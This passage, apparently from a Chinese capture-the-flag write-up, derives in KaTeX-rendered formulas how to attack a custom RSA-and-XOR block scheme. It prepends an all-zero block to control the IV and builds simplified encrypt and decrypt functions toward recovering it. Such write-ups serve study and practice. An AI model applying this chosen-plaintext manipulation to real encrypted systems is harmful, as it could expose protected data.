mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span></span></p><hr /><p>但是光凭这样两个化简版的函数，并不能得到<code>iv</code></p><p>另外又发现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>=</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">encrypt(ZERO)=ZERO=decrypt(ZERO)=ZERO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span></p><p>（设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">ZERO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span>为长度为256B，并且全为0的Bytes）</p><p>看上去没什么用，但是实际上根据原来的代码，我们可以控制下一个Block的“iv”。</p><p>所以可以把原来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">plaintext</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span></span></span></span>拼在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">ZERO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span>后面，变成两个Block。</p><p>那么根据原来的代码可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>+</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>+</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>+</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">encrypt(ZERO+plaintext)=ZERO+RSA(plaintext \oplus RSA(iv))\oplus RSA(ZERO)\\=ZERO+RSA(plaintext \oplus RSA(iv)) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p>（上面一步是因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo stretchy="false">)</mo><mo>=</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">RSA(ZERO)=ZERO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span></span></span></span>，并且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mo>⊕</mo><mi>Z</mi><mi>E</mi><mi>R</mi><mi>O</mi><mo>=</mo><mi>B</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">Bytes\oplus ZERO=Bytes</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span></span></span></span>）</p><p>所以取后半部分，设</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>Z</mi><mi>e</mi><mi>r</mi><mi>o</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">encryptZero(plaintext)=RSA(plaintext \oplus RSA(iv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span></p><p>那么同理可得$$decryptZero(cipher)=RSA^{-1}(cipher) \oplus RSA(iv)$$</p><hr /><p>那么我们现在就有了四个函数</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">encrypt(plaintext)=RSA(plaintext \oplus iv)\oplus RSA(iv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>⊕</mo><mi>i</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">decrypt(cipher)=RSA^{-1}(cipher \oplus RSA(iv))\oplus iv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>Z</mi><mi>e</mi><mi>r</mi><mi>o</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>p</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>⊕</mo><mi>R</mi><mi>S</mi><mi>A</mi><mo stretchy="false">(</mo><mi>i</mi><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">encryptZero(plaintext)=RSA(plaintext \oplus RSA(iv)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">A</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>Z</mi><mi>e</mi><mi>r</mi><mi>o</mi><mo stretchy="false">(</mo><mi>c</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo 